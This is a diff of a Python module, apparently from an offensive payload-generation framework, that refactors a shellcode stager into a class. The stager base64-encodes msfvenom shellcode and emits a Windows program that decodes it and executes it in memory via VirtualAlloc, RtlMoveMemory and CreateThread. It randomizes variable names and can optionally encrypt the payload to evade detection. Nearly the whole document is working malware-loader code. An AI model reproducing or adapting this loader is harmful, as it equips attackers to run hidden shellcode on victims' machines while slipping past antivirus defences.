@@ -1,38 +1,64 @@
-# Import Modules
+"""
+
+This payload receives the msfvenom shellcode, base64 encodes it, and stores it within the payload.
+At runtime, the executable decodes the shellcode and executes it in memory.
+
+
+module by @christruncer
+
+"""
+
 import base64
-from modules.auxiliary import shellcode
+
+from modules.common import shellcode
 from modules.common import messages
 from modules.common import randomizer
-from modules.common import supportfiles
+from modules.common import crypters
+from modules.common import encryption
 
-def pyb64VAlloc():
-    # Generate Shellcode Using msfvenom
-    Shellcode = shellcode.genShellcode()    
 
-    # Base64 Encode Shellcode
-    EncodedShellcode = base64.b64encode(Shellcode)    
+class Stager:
+	
+	def __init__(self):
+		# required options
+		self.shortname = "b64VirtualAlloc"
+		self.description = "Base64 encoded shellcode is decoded at runtime and executed in memory"
+		self.language = "python"
+		self.rating = "Excellent"
+		self.extension = "py"
+		
+		# optional
+		self.shellcode = shellcode.Shellcode()
+		# options we require user interaction for- format is {Option : [Value, Description]]}
+		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
+						"use_encrypter" : ["N", "Use the python encrypter"]}
+	
+	def generate(self):
+		
+		# Generate Shellcode Using msfvenom
+		Shellcode = self.shellcode.generate()
+		
+		# Base64 Encode Shellcode
+		EncodedShellcode = base64.b64encode(Shellcode)    
 
-    # Generate Random Variable Names
-    ShellcodeVariableName = randomizer.randomString()
-    RandPtr = randomizer.randomString()
-    RandBuf = randomizer.randomString()
-    RandHt = randomizer.randomString()
-    RandT = randomizer.randomString()
+		# Generate Random Variable Names
+		ShellcodeVariableName = randomizer.randomString()
+		RandPtr = randomizer.randomString()
+		RandBuf = randomizer.randomString()
+		RandHt = randomizer.randomString()
+		RandT = randomizer.randomString()
+					
+		PayloadCode = 'import ctypes\n'
+		PayloadCode +=  'import base64\n'
+		PayloadCode += RandT + " = \"" + EncodedShellcode + "\"\n"
+		PayloadCode += ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
+		PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
+		PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
+		PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
+		PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
+		PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
 
-    # Create Payload File
-    PayloadFile = open('payload.py', 'w')
-    PayloadFile.write('#!/usr/bin/python\n\n')
-    PayloadFile.write('import ctypes\n')
-    PayloadFile.write('import base64\n\n')
-    PayloadFile.write(RandT + " = \"" + EncodedShellcode + "\"\n")
-    PayloadFile.write(ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n")
-    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
-    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
-    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
-    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
-    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
-    PayloadFile.close()
+		if self.required_options["use_encrypter"][0].lower() == "y":
+			PayloadCode = crypters.pyherion(PayloadCode)
 
-    # Create Supporting Files and Print Exit Message
-    supportfiles.supportingFiles()
-    messages.endmsg()
+		return PayloadCode
